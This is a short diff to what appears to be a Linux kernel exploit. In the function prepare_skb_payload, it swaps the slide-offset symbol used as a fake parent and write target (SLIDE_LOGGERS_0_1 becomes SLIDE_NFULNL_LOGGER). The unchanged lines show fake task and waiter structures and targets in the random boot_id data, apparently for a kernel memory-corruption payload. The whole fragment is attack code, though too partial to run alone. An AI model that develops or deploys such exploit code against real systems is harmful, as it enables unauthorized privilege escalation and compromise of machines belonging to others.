@@ -585,7 +585,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         }
 #else
         uintptr_t offset = slide_bank_offsets[slot];
-        parent = SLIDE_LOGGERS_0_1 + offset;
+        parent = SLIDE_NFULNL_LOGGER + offset;
         target = SLIDE_RANDOM_BOOT_ID_DATA + offset;
 #endif
         slide_bank_parents[slot] = parent;
@@ -672,7 +672,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1 + slide_p0_offset;
+    write_pc = SLIDE_NFULNL_LOGGER + slide_p0_offset;
     write_right = 0;
     write_left = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
